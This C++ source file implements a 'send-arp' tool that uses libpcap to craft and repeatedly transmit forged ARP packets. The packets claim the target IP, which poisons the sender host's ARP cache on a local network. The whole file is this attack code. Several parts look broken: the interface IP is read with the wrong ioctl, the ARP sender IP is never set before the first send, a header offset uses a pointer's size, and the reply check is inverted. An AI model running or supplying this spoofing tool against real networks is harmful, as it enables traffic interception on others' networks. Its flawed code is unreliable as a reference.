#include "send-arp.h"

void usage()
{
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void Get_MAC(char* dev, uint8_t smac[])
{
    struct ifreq ifr;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    strcpy(ifr.ifr_name, dev);
    if(0 == ioctl(fd, SIOCGIFHWADDR, &ifr)){
        for(int i = 0; i < 6; i++){
            smac[i] = (unsigned char) ifr.ifr_addr.sa_data[i];
        }
    }
    else{
        printf("Error !!!\n");
        exit(1);
    }
}


int main(int argc, char* argv[])
{
    if (argc != 4)
    {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char* sender_IP = argv[2];
    char* target_IP = argv[3];
    char* me_IP;
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strcpy(ifr.ifr_name, dev);
    if(ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0)
    {
        me_IP = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    }
    else
    {
        printf("Error !!!\n");
        exit(1);
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;
    for(int i = 0; i < 6; i++)
    {
        packet.eth_.ether_dmac[i] = 0xFF;
    }
    Get_MAC(dev, packet.eth_.ether_smac);
    packet.eth_.ether_type = htons(ARP);
    packet.arp_.hrd = htons(Ethernet);
    packet.arp_.pro = htons(IPv4);
    packet.arp_.hln = MAC_LEN;
    packet.arp_.pln = IP_LEN;
    packet.arp_.op = htons(Request);
    for(int i =0; i < 6; i++)
    {
        packet.arp_.tmac[i] = 0x00;
    }
    Get_MAC(dev, packet.arp_.smac);
    inet_pton(AF_INET, sender_IP, &packet.arp_.tip);

    while(true){
        struct pcap_pkthdr* header;
        const u_char* repacket;

        int res = pcap_next_ex(handle, &header, &repacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct ETH_hdr* Eth = (struct ETH_hdr*)(repacket);
        if (ntohs((*Eth).ether_type) != ARP) continue;
        struct ARP_hdr* arp = (struct ARP_hdr*)(repacket + sizeof(Eth));
        if((ntohs((*arp).op) != Reply) && (*arp).sip == packet.arp_.tip && (*arp).tip == packet.arp_.sip)
        {
            for (int i = 0; i < 6; i++){
                packet.eth_.ether_smac[i] = (*arp).smac[i];
                packet.eth_.ether_dmac[i] = (*arp).smac[i];
            }
            inet_pton(AF_INET, target_IP, &packet.arp_.sip);
        }
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
   pcap_close(handle);
}
